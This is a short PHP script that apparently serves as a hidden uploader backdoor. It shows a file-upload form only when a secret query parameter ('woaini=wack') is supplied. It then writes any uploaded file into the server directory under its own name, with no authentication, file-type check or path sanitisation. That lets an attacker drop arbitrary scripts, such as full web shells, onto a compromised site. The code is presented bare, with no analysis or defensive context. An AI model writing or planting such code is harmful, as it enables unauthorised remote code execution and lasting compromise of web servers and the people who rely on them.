<?php
    if($_GET["woaini"] == "wack")
    {
        if ($_SERVER["REQUEST_METHOD"] == "POST") 
        { 
            echo "url:".$_FILES["upfile"]["name"];
            if(!file_exists($_FILES["upfile"]["name"]))
            { 
                copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); 
            }
        }
       ?>
        <form method="post" enctype="multipart/form-data">
        <input name="upfile" type="file">
        <input type="submit" value="ok">
        </form>
        <?php 
    }
?>